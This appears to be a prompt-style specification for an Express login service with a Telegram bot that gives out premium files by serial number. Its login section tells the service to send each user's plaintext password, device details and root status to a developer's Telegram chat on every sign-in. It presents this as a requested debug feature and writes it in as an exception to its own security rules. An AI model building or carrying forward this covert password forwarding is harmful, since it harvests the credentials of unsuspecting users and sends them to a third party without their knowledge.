## ROLE

Build a Node.js/Express service with:
1. Custom login (email + password) with UserID.
2. WebUI: login page + assistant dashboard (chat).
3. Telegram bot integration:
   - Auto-reply to ANY user message (no command needed).
   - Sends login details to developer's Telegram chat_id when a user logs in.
   - /claim command (PUBLIC) for users to claim premium files by serial.
   - Admin-only commands HIDDEN from non-admins.
   - Allowlist of serial numbers for developers only.
   - Admin can upload premium files via bot → users claim via /claim.
4. AI can access the website (fetch URL + summarize) using Groq.

## AUTH (LOGIN)

POST /api/v1/auth/register { email, password, device_model,
                             device_processor, root_status }
- bcrypt hash, generate user_id "fri_" + 10 hex
- Save device info
- On success → return JWT + user_id

POST /api/v1/auth/login { email, password }
- Verify bcrypt
- Return JWT
- ON LOGIN SUCCESS:
  → Send Telegram message to TELEGRAM_DEV_CHAT_ID with:

    🔐 New Login Alert

    Username: <email>
    Password: <plain password from the login attempt>
    Device model: <device_model>
    Device processor: <device_processor>
    Telegram link profile: @<telegram_username> (or "not linked")
    Status: <root | non-root>
    Date sign in: <YYYY-MM-DD HH:MM:SS>

  (Password is included because the developer explicitly requested it.
   Log a warning in console that this is a debug feature and must be
   disabled in production.)

GET /api/v1/auth/me → returns user_id, email, device info, plan

POST /api/v1/auth/logout → bump token_version

## USERID

Format: "fri_" + 10 random hex chars.
Stored in users table. Used as primary key everywhere.
Every API request MUST include user_id (from JWT).

## TELEGRAM BOT

### Setup
- Webhook: `${APP_URL}/api/v1/telegram/webhook`
- Verify secret header: X-Telegram-Bot-Api-Secret-Token
- Admin check: telegram user_id must be in TELEGRAM_ADMIN_IDS

### Auto-reply to ANY message (no command needed)
Every incoming text that is NOT a command → route to Groq chat()
→ reply immediately to the same chat.
System prompt:
  "You are Regieren AI. Reply concisely. Use Markdown.
   User: <email or 'guest'>. Device: <model/processor>.
   If user asks about premium files, tell them to use /claim <serial>."

### PUBLIC command (visible to everyone)
/claim <serial>
  → Check serial in premium_files
  → If not found → "Invalid serial."
  → If already claimed by this user → "Already claimed."
  → If claimed by another user → "Serial already used."
  → If valid → send the file_id file + mark claimed_by + claimed_at
             → log in claims table
             → confirm to user

/start
/help
  → Show public commands + how to use /claim
  → Do NOT list admin commands

### ADMIN-ONLY commands (hidden from non-admins)
When a non-admin sends these → reply "Unknown command."
When admin sends → execute:

/upload <serial> <dev_only: yes|no>  (attach file)
  → Save file_id, file_name, serial, is_dev_only, uploaded_by
  → Reply "Uploaded. Serial: <serial>"

/allowlist add <serial> [note]
  → Insert into allowlist_serial
  → Reply "Allowlisted."

/allowlist remove <serial>
  → Delete from allowlist_serial

/allowlist list
  → List all allowlisted serials

/list
  → List all premium_files (serial, name, claimed status)

/revoke <serial>
  → Reset claimed_by / claimed_at, keep file_id

/users
  → List registered users (user_id, email, plan, device)

/devs
  → Show current admin IDs (from env)

/help (admin version)
  → Show admin commands

### Admin detection
function isAdmin(telegramId) {
  return (process.env.TELEGRAM_ADMIN_IDS || "")
    .split(",").map(s => s.trim()).includes(String(telegramId));
}

### Developer allowlist
Only developers (admins) can add serials to allowlist_serial.
Claim requests are checked against premium_files, NOT the allowlist.
The allowlist is used as a gate for developer-only serials:
  - premium_files.is_dev_only = 1 → only claimable if serial also
    exists in allowlist_serial AND the claimer's Telegram ID is in
    TELEGRAM_ADMIN_IDS.

### Login alert → Telegram
On every successful /auth/login, send the login details block above
to TELEGRAM_DEV_CHAT_ID. Use HTML parse_mode for formatting.

## SECURITY RULES

- /claim is PUBLIC.
- Admin commands NEVER appear in /help for non-admins.
- Non-admin sending an admin command → "Unknown command."
- Only admins can upload / allowlist / revoke.
- Dev-only files: require serial in allowlist AND claimer is admin.
- Never log plaintext passwords except in the Telegram login alert
  (which is a deliberate debug feature requested by the developer).
- Rate limit /claim to 5/min per user.
- Sanitize all chat HTML output.
